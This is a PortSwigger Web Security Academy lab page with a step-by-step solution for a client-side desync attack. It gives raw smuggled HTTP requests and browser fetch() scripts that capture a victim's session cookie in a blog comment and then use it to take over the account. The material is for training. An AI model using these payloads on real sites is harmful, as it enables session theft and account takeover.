# Lab: Client-side desync

Source: https://portswigger.net/web-security/request-smuggling/browser/client-side-desync/lab-client-side-desync
Fetched: 2026-06-28T09:18:00.987501+00:00

Web Security Academy

Request smuggling

Browser-powered

Client-side desync

Lab

Lab: Client-side desync

This lab is vulnerable to client-side desync attacks because the server ignores the Content-Length header on requests to some endpoints. You can exploit this to induce a victim's browser to disclose its session cookie.

To solve the lab:

Identify a client-side desync vector in Burp, then confirm that you can replicate this in your browser.

Identify a gadget that enables you to store text data within the application.

Combine these to craft an exploit that causes the victim's browser to issue a series of cross-domain requests that leak their session cookie.

Use the stolen cookie to access the victim's account.

Hint

This lab is a client-side variation of a technique we covered in a previous request smuggling lab.

This lab is based on real-world vulnerabilities discovered by PortSwigger Research. For more details, check out Browser-Powered Desync Attacks: A New Frontier in HTTP Request Smuggling.

Solution

Identify a vulnerable endpoint

Notice that requests to / result in a redirect to /en.

Send the GET / request to Burp Repeater.

In Burp Repeater, use the tab-specific settings to disable the Update Content-Length option.

Convert the request to a POST request (right-click and select Change request method).

Change the Content-Length to 1 or higher, but leave the body empty.

Send the request. Observe that the server responds immediately rather than waiting for the body. This suggests that it is ignoring the specified Content-Length.

Confirm the desync vector in Burp

Re-enable the Update Content-Length option.

Add an arbitrary request smuggling prefix to the body:

POST / HTTP/1.1

Host: YOUR-LAB-ID.h1-web-security-academy.net

Connection: close

Content-Length: CORRECT

GET /hopefully404 HTTP/1.1

Foo: x

Add a normal request for GET / to the tab group, after your malicious request.

Using the drop-down menu next to the Send button, change the send mode to Send group in sequence (single connection).

Change the Connection header of the first request to keep-alive.

Send the sequence and check the responses. If the response to the second request matches what you expected from the smuggled prefix (in this case, a 404 response), this confirms that you can cause a desync.

Replicate the desync vector in your browser

Open a separate instance of Chrome that is not proxying traffic through Burp.

Go to the exploit server.

Open the browser developer tools and go to the Network tab.

Ensure that the Preserve log option is selected and clear the log of any existing entries.

Go to the Console tab and replicate the attack from the previous section using the fetch() API as follows:

fetch('https://YOUR-LAB-ID.h1-web-security-academy.net', {

method: 'POST',

body: 'GET /hopefully404 HTTP/1.1\r\nFoo: x',

mode: 'cors',

credentials: 'include',

}).catch(() => {

fetch('https://YOUR-LAB-ID.h1-web-security-academy.net', {

mode: 'no-cors',

credentials: 'include'

})

})

Note that we're intentionally triggering a CORS error to prevent the browser from following the redirect, then using the catch() method to continue the attack sequence.

On the Network tab, you should see two requests:

The main request, which has triggered a CORS error.

A request for the home page, which received a 404 response.

This confirms that the desync vector can be triggered from a browser.

Identify an exploitable gadget

Back in Burp's browser, visit one of the blog posts and observe that this lab contains a comment function.

From the Proxy > HTTP history, find the GET /en/post?postId=x request. Make note of the following:

The postId from the query string

Your session and _lab_analytics cookies

The csrf token

In Burp Repeater, use the desync vector from the previous section to try to capture your own arbitrary request in a comment. For example:

Request 1:

POST / HTTP/1.1

Host: YOUR-LAB-ID.h1-web-security-academy.net

Connection: keep-alive

Content-Length: CORRECT

POST /en/post/comment HTTP/1.1

Host: YOUR-LAB-ID.h1-web-security-academy.net

Cookie: session=YOUR-SESSION-COOKIE; _lab_analytics=YOUR-LAB-COOKIE

Content-Length: NUMBER-OF-BYTES-TO-CAPTURE

Content-Type: x-www-form-urlencoded

Connection: keep-alive

csrf=YOUR-CSRF-TOKEN&postId=YOUR-POST-ID&name=wiener&email=wiener@web-security-academy.net&website=https://ginandjuice.shop&comment=

Request 2:

GET /capture-me HTTP/1.1

Host: YOUR-LAB-ID.h1-web-security-academy.net

Note that the number of bytes that you try to capture must be longer than the body of your POST /en/post/comment request prefix, but shorter than the follow-up request.

Back in the browser, refresh the blog post and confirm that you have successfully output the start of your GET /capture-me request in a comment.

Replicate the attack in your browser

Open a separate instance of Chrome that is not proxying traffic through Burp.

Go to the exploit server.

Open the browser developer tools and go to the Network tab.

Ensure that the Preserve log option is selected and clear the log of any existing entries.

Go to the Console tab and replicate the attack from the previous section using the fetch() API as follows:

fetch('https://YOUR-LAB-ID.h1-web-security-academy.net', {

method: 'POST',

body: 'POST /en/post/comment HTTP/1.1\r\nHost: YOUR-LAB-ID.h1-web-security-academy.net\r\nCookie: session=YOUR-SESSION-COOKIE; _lab_analytics=YOUR-LAB-COOKIE\r\nContent-Length: NUMBER-OF-BYTES-TO-CAPTURE\r\nContent-Type: x-www-form-urlencoded\r\nConnection: keep-alive\r\n\r\ncsrf=YOUR-CSRF-TOKEN&postId=YOUR-POST-ID&name=wiener&email=wiener@web-security-academy.net&website=https://portswigger.net&comment=',

mode: 'cors',

credentials: 'include',

}).catch(() => {

fetch('https://YOUR-LAB-ID.h1-web-security-academy.net/capture-me', {

mode: 'no-cors',

credentials: 'include'

})

})

On the Network tab, you should see three requests:

The initial request, which has triggered a CORS error.

A request for /capture-me, which has been redirected to the post confirmation page.

A request to load the post confirmation page.

Refresh the blog post and confirm that you have successfully output the start of your own /capture-me request via a browser-initiated attack.

Exploit

Go to the exploit server.

In the Body panel, paste the script that you tested in the previous section.

Wrap the entire script in HTML <script> tags.

Store the exploit and click Deliver to victim.

Refresh the blog post and confirm that you have captured the start of the victim user's request.

Repeat this attack, adjusting the Content-Length of the nested POST /en/post/comment request until you have successfully output the victim's session cookie.

In Burp Repeater, send a request for /my-account using the victim's stolen cookie to solve the lab.

Community solutions

Jarno Timmermans

Find HTTP request smuggling vulnerabilities using Burp Suite

Try for free
